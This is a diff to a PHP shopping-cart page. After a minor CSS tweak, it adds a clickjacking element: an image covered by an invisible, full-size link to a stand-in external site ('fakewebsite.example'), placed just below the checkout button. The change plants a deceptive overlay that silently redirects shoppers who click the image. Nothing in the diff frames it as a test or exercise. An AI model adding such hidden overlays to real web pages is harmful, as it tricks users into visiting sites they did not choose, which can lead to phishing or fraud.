@@ -72,6 +72,7 @@ mysqli_data_seek($cart_items, 0);
             display: flex;
             gap: 20px;
             padding: 20px;
+            flex-direction: column;
         }
 
        .cart-items {
@@ -148,6 +149,26 @@ mysqli_data_seek($cart_items, 0);
             cursor: pointer;
             margin-top: 20px;
         }
+
+       .clickjacking-container {
+            position: relative;
+            margin-top: 20px;
+        }
+
+       .clickjacking-image {
+            width: 100%;
+            height: auto;
+        }
+
+       .clickjacking-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
     </style>
 </head>
 
@@ -198,6 +219,11 @@ mysqli_data_seek($cart_items, 0);
             <span id="total-price">€ <?php echo number_format($total, 2); ?></span>
         </div>
         <button class="checkout-btn" onclick="window.location.href='checkout.php'">CHECKOUT</button>
+    </div>
+
+    <div class="clickjacking-container">
+        <img class="clickjacking-image" src="https://picsum.photos/800/400" alt="Random Image">
+        <a href="https://fakewebsite.example" class="clickjacking-overlay"></a>
     </div>
 
     <script>
